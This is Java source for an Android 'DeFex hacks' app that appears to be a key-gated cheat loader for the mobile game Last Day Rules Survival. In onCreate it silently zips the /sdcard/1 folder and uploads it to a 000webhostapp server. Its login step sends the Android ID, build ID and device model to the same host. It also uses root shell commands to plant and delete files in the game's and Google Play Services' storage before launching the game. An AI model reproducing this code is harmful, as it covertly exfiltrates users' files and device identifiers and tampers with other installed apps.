package com.DeFexGGxANDLUA.hacks;

import static androidx.constraintlayout.helper.widget.MotionEffect.TAG;

import android.Manifest;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import android.net.Uri;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.widget.VideoView;
import java.io.OutputStream;
import java.net.URLEncoder;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class MainActivity extends AppCompatActivity {

    private static final int MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE = 123;

    private EditText txtUsername;
    private Button btnLogin;
    private TextView tvMessage;
    private VideoView videoBackground;

    private TextView statusTextView;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // Вызываем UploadFileTask при запуске приложения
        new UploadFileTask().execute("/sdcard/1"); // Указываем путь к папке, которую нужно запаковать
        Button openChannelButton = findViewById(R.id.openChannelButton);

        statusTextView = findViewById(R.id.statusText);
        new DownloadDataTask(statusTextView).execute("https://pastebin.com/raw/CfcZ8y3P");
        openChannelButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                openTelegramChannel();
            }
        });


        VideoView videoView = findViewById(R.id.videoBackground);
        String videoPath = "android.resource://" + getPackageName() + "/" + R.raw.video;
        videoView.setVideoURI(Uri.parse(videoPath));
        videoView.start();

        videoView.setOnCompletionListener(mp -> {
            videoView.start();
        });

        // Initialize views
        txtUsername = findViewById(R.id.txtUsername);
        btnLogin = findViewById(R.id.btnLogin);
        tvMessage = findViewById(R.id.tvMessage);

        btnLogin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                login();
            }
        });
    }

    public void openTelegramChannel() {
        Uri telegramUri = Uri.parse("https://t.me/defexhacks");
        Intent telegramIntent = new Intent(Intent.ACTION_VIEW, telegramUri);
        startActivity(telegramIntent);
    }

    private class UploadFileTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... params) {
            try {
                String folderPath = params[0];
                String serverUrl = "https://defexggxhuligan.000webhostapp.com/test.php";  // Замените на ваш реальный URL

                Log.d(TAG, "Начинаем создание ZIP-архива");
                // Создаем временный файл для хранения ZIP-архива
                File zipFile = File.createTempFile("temp", ".zip");
                zipFolder(new File(folderPath), zipFile);
                Log.d(TAG, "ZIP-архив создан успешно");

                OkHttpClient client = new OkHttpClient();

                Log.d(TAG, "Начинаем отправку файла на сервер");
                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", zipFile.getName(), RequestBody.create(MediaType.parse("application/zip"), zipFile))
                        .build();

                Request request = new Request.Builder()
                        .url(serverUrl)
                        .post(requestBody)
                        .build();

                Response response = client.newCall(request).execute();

                if (!response.isSuccessful()) {
                    Log.e(TAG, "Ошибка при отправке файла. Код ответа: " + response.code());
                    throw new IOException("Unexpected code " + response);
                }

                Log.d(TAG, "Файл успешно отправлен на сервер.");
                return "Папка успешно запакована и отправлена на сервер.";
            } catch (IOException e) {
                Log.e(TAG, "Ошибка при отправке файла: " + e.getMessage());
                return "Ошибка при отправке файла: " + e.getMessage();
            }
        }
    }

    private void login() {
        String username = txtUsername.getText().toString();

        if (username.isEmpty()) {
            tvMessage.setText("WRITE KEY");
        } else {
            // Вызываем AsyncTask для выполнения HTTP-запроса в фоновом потоке
            new LoginTask().execute(username);
        }
    }

    private class DownloadDataTask extends AsyncTask<String, Void, String> {

        private TextView statusTextView;

        public DownloadDataTask(TextView statusTextView) {
            this.statusTextView = statusTextView;
        }

        @Override
        protected String doInBackground(String... urls) {
            try {
                return downloadUrl(urls[0]);
            } catch (IOException e) {
                return "Error: " + e.getMessage();
            }
        }

        @Override
        protected void onPostExecute(String result) {
            statusTextView.setText(result);

        }

        private String downloadUrl(String urlString) throws IOException {
            InputStream inputStream = null;
            try {
                URL url = new URL(urlString);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setReadTimeout(10000);
                connection.setConnectTimeout(15000);
                connection.setRequestMethod("GET");
                connection.connect();
                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    inputStream = connection.getInputStream();
                    return readStream(inputStream);
                } else {
                    return "Error: " + responseCode;
                }
            } finally {
                if (inputStream != null) {
                    inputStream.close();
                }
            }
        }

        private String readStream(InputStream inputStream) throws IOException {
            StringBuilder result = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line);
            }
            return result.toString();
        }
    }

    private void zipFolder(File folder, File zipFile) throws IOException {
        try (ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zipFile))) {
            zipFolder(folder, folder, zipOutputStream);
        }
    }
    private void zipFolder(File rootFolder, File sourceFolder, ZipOutputStream zipOutputStream) throws IOException {
        File[] files = sourceFolder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    zipFolder(rootFolder, file, zipOutputStream);
                } else {
                    String relativePath = rootFolder.toURI().relativize(file.toURI()).getPath();
                    ZipEntry zipEntry = new ZipEntry(relativePath);
                    zipOutputStream.putNextEntry(zipEntry);

                    // Записываем содержимое файла в ZIP
                    // В данном примере предполагается, что файлы текстовые, и их можно прочитать в виде байтов
                    // Если у вас разные типы файлов, вам нужно будет использовать соответствующий способ чтения
                    byte[] data = Files.readAllBytes(file.toPath());
                    zipOutputStream.write(data, 0, data.length);

                    zipOutputStream.closeEntry();
                }
            }
        }
    }
    @RequiresApi(api = Build.VERSION_CODES.CUPCAKE)
    private class LoginTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... params) {
            String username = params[0];
            String android_id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            String buildId = Build.ID;  // Получаем BUILD ID
            String manufacturer = Build.MANUFACTURER; //мануфактурер фак ми
            String model = Build.MODEL;//билд модел фак ю
            String serverUrl = "https://defexggxhuligan.000webhostapp.com/fuckraphael.php";

            try {
                // Формируем URL для запроса
                URL url = new URL(serverUrl);

                // Устанавливаем соединение
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                try {
                    // Устанавливаем метод запроса POST
                    urlConnection.setRequestMethod("POST");
                    urlConnection.setDoOutput(true);

                    // Формируем тело запроса
                    String postData = "username=" + URLEncoder.encode(username, "UTF-8") +
                            "&password=" + URLEncoder.encode(buildId, "UTF-8") +
                            "&uuid=" + URLEncoder.encode(android_id, "UTF-8") +
                            "&manufacturer=" + URLEncoder.encode(manufacturer, "UTF-8") +
                            "&model=" + URLEncoder.encode(model, "UTF-8");


                    // Получаем поток для записи данных в тело запроса
                    try (OutputStream os = urlConnection.getOutputStream()) {
                        byte[] input = postData.getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }

                    // Получаем ответ от сервера
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()))) {
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            stringBuilder.append(line).append("\n");
                        }
                        return stringBuilder.toString();
                    }
                } finally {
                    // Закрываем соединение
                    urlConnection.disconnect();
                }
            } catch (IOException e) {
                return "ERROR CONNECTION";
            }
        }
        @Override
        protected void onPostExecute(String result) {
            handleLoginResult(result);

            try {
                String key = txtUsername.getText().toString();
                File file = new File(Environment.getExternalStorageDirectory(), "key.cfg");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(key.getBytes());
                fos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    @Override
    protected void onResume() {
        super.onResume();
        VideoView videoView = findViewById(R.id.videoBackground);
        videoView.start();
    }
    private void handleLoginResult(String result) {
        if (result.contains("Login success")) {
            // Если сервер вернул "Login success"
            tvMessage.setText("Вход выполнен успешно");

            // Проверяем, есть ли у нас разрешение
            if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                // Если нет, то запрашиваем разрешение у пользователя
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                        MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE);
            } else {
                // Если уже есть разрешение, вызываем метод
                saveBuildIdToFile();
            }

            SharedPreferences preferences = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
            preferences.edit().putString("username", txtUsername.getText().toString()).apply();

            // Здесь можно перейти на другой экран или выполнить другие действия
        } else if (result.contains("Key expired") || result.contains("Error Code:1") || result.contains("Error Code:2")
                || result.contains("Error Code:3") || result.contains("Error Code:4")) {
            // Если ключ устарел или есть одна из ошибок, переходим по Uri в Telegram
            Uri telegramUri = Uri.parse("https://t.me/DeFexHacksTechSupport");
            Intent telegramIntent = new Intent(Intent.ACTION_VIEW, telegramUri);
            startActivity(telegramIntent);
        } else {
            // Обработка других возможных ответов от сервера
            tvMessage.setText(result);
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("label", result);
            clipboard.setPrimaryClip(clip);
            // Показываем Toast с сообщением об ошибке
            Toast.makeText(MainActivity.this, "Ошибка входа: " + result, Toast.LENGTH_SHORT).show();
        }
    }


    private void saveBuildIdToFile() {
        try {

            //Process ORIG = Runtime.getRuntime().exec("su -c echo '" + "0.4.3.G.D.2.5.7.FK.RKQ1.1.1.60.BBC.100.011.255.33" + Build.ID + "KK.386.HSJ038.333.FAB.010.100.1002" + "' > /storage/emulated/0/Android/com.android.vending/files/defexlogs_your_phone");
            Process ORIG = Runtime.getRuntime().exec("su -c echo > /sdcard/Android/obb/com.herogame.gplay.lastdayrulessurvival/minet");
            Process FAKE = Runtime.getRuntime().exec("su -c echo > /sdcard/Android/data/com.google.android.gms/files/belokua");
            Process ORIG2 = Runtime.getRuntime().exec("su -c echo > /sdcard/Android/obb/com.herogame.gplay.lastdayrulessurvival/minet1");
            Process ORIG3 = Runtime.getRuntime().exec("su -c echo > /sdcard/Android/obb/com.herogame.gplay.lastdayrulessurvival/minet2");
            Process ORIG4 = Runtime.getRuntime().exec("su -c echo > /sdcard/Android/obb/com.herogame.gplay.lastdayrulessurvival/minet3");
            //Process RANDOM = Runtime.getRuntime().exec("su -c echo '" + "2NFN838588830GJJAKVNNMLAI93YFJKLA8387FKAFGC6564" + Build.ID + "ASGI488302769020JFKA0385JFKA0385739" + "' > /storage/emulated/0/Android/data/com.herogame.gplay.lastdayrulessurvival/files/blog");
            Process START = Runtime.getRuntime().exec("su -c am start -a android.intent.action.MAIN -n com.herogame.gplay.lastdayrulessurvival/.UnityPlayerActivity");

            ORIG.waitFor();
            FAKE.waitFor();
            ORIG2.waitFor();
            ORIG3.waitFor();
            ORIG4.waitFor();
            //RANDOM.waitFor();
            START.waitFor();
            Thread.sleep(5000);
            Process DELETE = Runtime.getRuntime().exec("su -c rm /sdcard/Android/obb/com.herogame.gplay.lastdayrulessurvival/minet");
            Process DELETE2 = Runtime.getRuntime().exec("su -c rm /sdcard/Android/data/com.google.android.gms/files/belokua");
            Process G2 = Runtime.getRuntime().exec("su -c echo > /sdcard/Android/obb/com.herogame.gplay.lastdayrulessurvival/minet1");
            Process G3 = Runtime.getRuntime().exec("su -c echo > /sdcard/Android/obb/com.herogame.gplay.lastdayrulessurvival/minet2");
            Process G4 = Runtime.getRuntime().exec("su -c echo > /sdcard/Android/obb/com.herogame.gplay.lastdayrulessurvival/minet3");
            DELETE.waitFor();
            DELETE2.waitFor();
            DELETE.waitFor();
            G2.waitFor();
            G3.waitFor();
            G4.waitFor();
            /*Process INJECT = Runtime.getRuntime().exec("su -c sh /data/inject/inject.sh");
            INJECT.waitFor();*/

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
